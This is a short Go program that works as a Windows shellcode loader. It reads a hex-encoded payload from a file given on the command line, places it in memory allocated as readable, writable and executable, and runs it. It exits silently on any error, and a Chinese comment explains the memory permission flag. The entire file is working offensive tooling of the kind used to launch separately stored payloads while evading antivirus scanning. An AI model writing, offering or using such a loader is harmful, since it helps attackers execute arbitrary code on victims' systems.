package main

import (
	"encoding/hex"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func readaFile(name string) []byte {
	a:=make([]byte,2048)
	f,err:=os.OpenFile(name,os.O_RDONLY,0666)
	if err!=nil{
		os.Exit(0)
	}
	_,_=f.Read(a)
	t,_:=hex.DecodeString(string(a))
	return t
}

func main() {
	if len(os.Args)==2{
		tt:=os.Args[1]
		shellCode :=readaFile(tt)
		addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellCode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if err != nil && err.Error() != "The operation completed successfully." {
			syscall.Exit(0)
		}
		_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellCode[0])), uintptr(len(shellCode)))
		if err != nil && err.Error() != "The operation completed successfully." {
			syscall.Exit(0)
		}
		syscall.Syscall(addr, 0, 0, 0, 0)
	}
}
